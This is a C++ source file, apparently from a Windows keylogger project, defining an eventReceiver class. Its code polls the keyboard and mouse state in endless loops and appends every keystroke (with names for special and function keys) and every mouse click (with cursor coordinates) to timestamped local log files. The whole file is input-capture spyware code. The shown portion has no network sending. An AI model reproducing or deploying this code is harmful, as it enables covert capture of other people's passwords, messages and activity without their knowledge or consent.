#include "eventReceiver.h"
#include "spider.h"
#include <fstream>
#include <iostream>
#include <string>
#include <windows.h>
#include <sstream>
#include <ctime>
#include <map>
#include <mutex>


eventReceiver::eventReceiver()
{
	_capsLock = false;
}

eventReceiver::~eventReceiver() {
}


void		eventReceiver::writeLogfile(int select, std::string log, char key, std::string pos, bool writePrompt)
{
	std::time_t		time;
	std::mutex		myMutex;
	std::ofstream _Klogfile;
	std::ofstream _Mlogfile;

	time = std::time(nullptr);
	if (writePrompt == true)
	{
		if (select == KEYBOARD)
		{
			std::lock_guard <std::mutex> lock(myMutex);
			_Klogfile.open("keylogs.txt", std::fstream::app);
			log = std::to_string(select) + " " + std::to_string((int)time) + " " + log + "\n";
			_Klogfile << log;
			_Klogfile.close();
		}
		else if (select == MOUSE)
		{
			std::lock_guard <std::mutex> lock(myMutex);
			_Mlogfile.open("mouselogs.txt", std::fstream::app);
			log = std::to_string(select) + " " + std::to_string((int)time) + " " + log + " " + pos + "\n";
			_Mlogfile << log;
			_Mlogfile.close();
		}
	}
	else if (writePrompt == false)
	{
		std::lock_guard <std::mutex> lock(myMutex);
		_Klogfile.open("keylogs.txt", std::fstream::app);
		log = std::to_string(select) + " " + std::to_string((int)time) + " " + key + "\n";
		_Klogfile << log;
		_Klogfile.close();
	}
}

void			eventReceiver::hookMouse()
{
	POINT    cursor;

	while (GetCursorPos(&cursor))
	{
		if (GetAsyncKeyState(VK_LBUTTON) != 0)
			writeLogfile(2, std::to_string(MOUSE_LEFT), 0, (std::to_string(cursor.x) + " " + std::to_string(cursor.y)), true);
		else if (GetAsyncKeyState(VK_RBUTTON) != 0)
			writeLogfile(2, std::to_string(MOUSE_RIGHT), 0, (std::to_string(cursor.x) + " " + std::to_string(cursor.y)), true);
		else if (GetAsyncKeyState(VK_MBUTTON) != 0)
			writeLogfile(2, std::to_string(MOUSE_CENTER), 0, (std::to_string(cursor.x) + " " + std::to_string(cursor.y)), true);
		Sleep(10);
	}
}

void			eventReceiver::hookKey()
{
	char key;

	while (1)
	{
		Sleep(10);
		for (key = 8; key <= 300; key++)
		{
			if (GetAsyncKeyState(key) == SHRT_MIN+1)
			{
				if (keyIsListed(key) == FALSE && key != VK_RBUTTON && key != VK_LBUTTON && key != VK_MBUTTON)
				{
					if (_capsLock == false && (key >= 'A' && key <= 'Z'))
						key += 32;
					writeLogfile(1, std::to_string(key), key, "0", false);
				}
			}
		}
	}
}

bool	eventReceiver::keyIsListed(int key)
{
	std::map<int, std::string> keyList;

	keyList[VK_SPACE]="[SPACE]";
	keyList[VK_RETURN]="[ENTER]";
	keyList[VK_SHIFT]="[SHIFT]";
	keyList[VK_BACK]="[BACKSPACE]";
	keyList[VK_TAB]="[TAB]";
	keyList[VK_CLEAR]="[CLEAR]";
	keyList[VK_CONTROL]="[CTRL]";
	keyList[VK_MENU]="[ALT]";
	keyList[VK_LMENU]="[ALT]";
	keyList[VK_RMENU]="[ALT]";
	keyList[VK_PAUSE]="[PAUSE]";
	keyList[VK_CAPITAL]="[CAPS_LOCK]";
	keyList[VK_ESCAPE]="[ESCAPE]";
	keyList[VK_PRIOR]="[PAGE_UP]";
	keyList[VK_NEXT]="[PAGE_DOWN]";
	keyList[VK_END]="[END]";
	keyList[VK_HOME]="[BEGIN]";
	keyList[VK_LEFT]="[LEFT_ARROW]";
	keyList[VK_RIGHT]="[RIGHT_ARROW]";
	keyList[VK_DOWN]="[DOWN_ARROW]";
	keyList[VK_UP]="[UP_ARROW]";
	keyList[VK_SELECT]="[SELECT]";
	keyList[VK_PRINT]="[PRINT]";
	keyList[VK_EXECUTE]="[EXECUTE]";
	keyList[VK_SNAPSHOT]="[SCREENSHOT]";
	keyList[VK_INSERT]="[INSERT]";
	keyList[VK_DELETE]="[DELETE]";
	keyList[VK_HELP]="[HELP]";
	keyList[91]="[HOME]";

	if (key == VK_CAPITAL)
	{
		if (_capsLock == false)
			_capsLock = true;
		else
			_capsLock = false;
	}

	if (key >= 112 && key <= 123)
	{
		writeLogfile(1, "[F" + std::to_string(key - 111) + "]", 0, "0", true);
		return true;
	}
	if (keyList[key] == "")
		return (false);
	writeLogfile(1, keyList[key], 0, "0", true);
	return true;
}
